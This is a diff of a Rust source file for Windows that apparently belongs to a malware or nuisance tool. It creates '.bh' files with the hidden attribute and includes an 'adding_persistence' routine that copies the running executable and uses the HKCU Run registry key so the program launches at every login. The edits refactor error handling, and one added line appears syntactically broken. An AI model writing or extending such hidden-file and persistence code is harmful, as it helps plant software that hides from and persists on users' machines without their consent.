@@ -1,8 +1,8 @@
 extern crate winapi;
 
 // use winreg::enums::RegType::REG_BINARY;
-use winreg::enums::{HKEY_CURRENT_USER, KEY_READ, KEY_SET_VALUE};
-use winreg::{RegKey, RegValue};
+use winreg::enums::{HKEY_CURRENT_USER, /*KEY_READ,*/ KEY_SET_VALUE};
+use winreg::{RegKey, /*RegValue*/};
 use std::os::windows::prelude::*;
 
 use filetime::{set_file_times,FileTime};
@@ -12,19 +12,31 @@ use std::io::*;
 static AL_REGKEY: &str = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 
 // Create the file when compiled on Windows system
-pub fn create_bloatfile(path: &str, name:String, data: Vec<u8>) -> String{	
+pub fn create_bloatfile(path: &str, name:String, data: Vec<u8>) -> Option<String>{	
 
 	let path_file: String = format!("{}{}.bh",path,name);
 
 	// Create a file with the hidden attribute
+	/*
 	let _ = File::options().create(true).write(true).attributes(winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN).open(&path_file).expect("Valid filepath").write_all(&data);
 
 	return path_file
+	*/
+
+
+	let _ = match File::options().create(true).write(true).attributes(winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN).open(&path_file){
+		Ok(mut file) => {
+			let _ = file.write_all(&data);
+			return Some(path_file);
+		},
+		Err(_err) => return None,
+
+	};
 
 }
 
 // Adding persistence for the windows compilation
-pub fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
+pub fn adding_persistence(exe_name: &str) -> std::io::Result<()>{
 	
 	// Get the path to the executable when its executed
 	let previous_exe_path = std::env::current_exe()?;
@@ -44,8 +56,7 @@ pub fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>
 			let _ = f.write_all(&buffer);
 		},
 		Err(err) => {
-			println!("File not found");
-			std::process::exit(1);
+			panic!("Failed to open the executable: {}", err),
 		}
 
 	};        
